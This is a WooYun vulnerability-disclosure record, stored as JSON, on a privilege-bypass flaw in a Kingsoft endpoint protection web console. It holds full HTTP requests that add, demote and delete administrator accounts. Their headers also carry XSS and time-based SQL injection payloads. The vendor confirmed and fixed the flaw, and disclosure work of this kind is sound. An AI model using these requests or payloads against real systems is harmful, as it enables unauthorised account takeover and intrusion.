{"id": 42238, "wybug_id": "wooyun-2014-086359", "wybug_title": "金山企业终端防护优化系统Web控制台越权添加/修改/删除任意用户（包括超级管理员）", "wybug_corp": "金山毒霸", "wybug_author": "xfkxfk", "wybug_date": "2014-12-09 11:15", "wybug_open_date": "2015-03-09 11:16", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 金山企业终端防护优化系统Web控制台越权添加/修改/删除任意用户（包括超级管理员） 详细说明：  金山企业终端防护优化系统Web控制台越权添加/修改/删除任意用户，包括超级管理员\n此系统的用户角色为：超级管理员，系统级别，默认无法修改普通管理员，可修改审计管理员，可修改配置管理员，可修改\n以普通管理员权限添加超级管理员：\nPOST /user_manage/user/ajax.kptl HTTP/1.1Host: 127.0.0.1:6868User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://127.0.0.1:6868/user_manage/user/main.php?li=4&a=6Content-Length: 290X-Forwarded-For: 123\"><img/src=1 onerror=alert(1)>127.0.0.1',`email`=(if(mid(user(),1,1)=char(114),sleep(3),0))#Connection: keep-alivePragma: no-cacheCache-Control: no-cache{\"add_user_info_cmd\":{\"userSession\":\"FEBE1888-E8C3-4331-9806-85F16C18460D\",\"mode_id\":\"DDDD9367-96F7-4790-909F-BA8E62D6D452\",\"real_name\":\"\",\"user_name\":\"111111\",\"type\":\"0\",\"tel\":\"\",\"mobile\":\"\",\"corp\":\"\",\"notice\":\"\",\"psw\":\"1a100d2c0dab19c4430e7d73762b3423\",\"email\":\"\",\"VHierarchyID\":\"ADMIN\"}}\n这里的type即为管理员类别，0代表超级管理员，1代表普通管理员这里添加超级管理员用户111111发送请求后，返回0即代表请求成功\n\n修改任意用户信息：可以修改任意角色用户，这里修改系统超级用户admin为普通管理员：\nPOST /user_manage/user/ajax.kptl HTTP/1.1Host: 127.0.0.1:6868User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://127.0.0.1:6868/user_manage/user/main.php?li=4&a=6Content-Length: 266X-Forwarded-For: 123\"><img/src=1 onerror=alert(1)>127.0.0.1',`email`=(if(mid(user(),1,1)=char(114),sleep(3),0))#Connection: keep-alivePragma: no-cacheCache-Control: no-cache{\"set_user_info_cmd\":{\"userSession\":\"E5BCAE25-2475-4D6C-8202-819D1863915A\",\"mode_id\":\"DDDD9367-96F7-4790-909F-BA8E62D6D452\",\"real_name\":\"\",\"user_name\":\"admin\",\"type\":\"1\",\"tel\":\"\",\"mobile\":\"\",\"corp\":\"\",\"notice\":\"\",\"psw\":\"e3ceb5881a0a1fdaad01296d7554868d\",\"email\":\"\"}}\n\n\n删除任意用户：这里删除用户222222，因为用户222222，不存在所以返回不是0，为7把用户名换成存在用户，即可删除任意角色用户\nPOST /user_manage/user/ajax.kptl HTTP/1.1Host: 127.0.0.1:6868User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://127.0.0.1:6868/user_manage/user/main.php?li=4&a=6Content-Length: 146X-Forwarded-For: 123\"><img/src=1 onerror=alert(1)>127.0.0.1',`email`=(if(mid(user(),1,1)=char(114),sleep(3),0))#Connection: keep-alivePragma: no-cacheCache-Control: no-cache{\"del_user_info_cmd\":{\"userSession\":\"FEBE1888-E8C3-4331-9806-85F16C18460D\",\"mode_id\":\"DDDD9367-96F7-4790-909F-BA8E62D6D452\",\"user_name\":\"222222\"}}\n\n\n   漏洞证明：  查看执行结果：\n\n不能修改的超级管理员admin变为可修改的普通管理员并添加超级管理员111111   修复方案：  普通用户和超级用户权限划分清楚   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-12-11 15:51 厂商回复： 收到，我们将尽快确认并推动修复。 最新状态： 2015-01-13：已修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}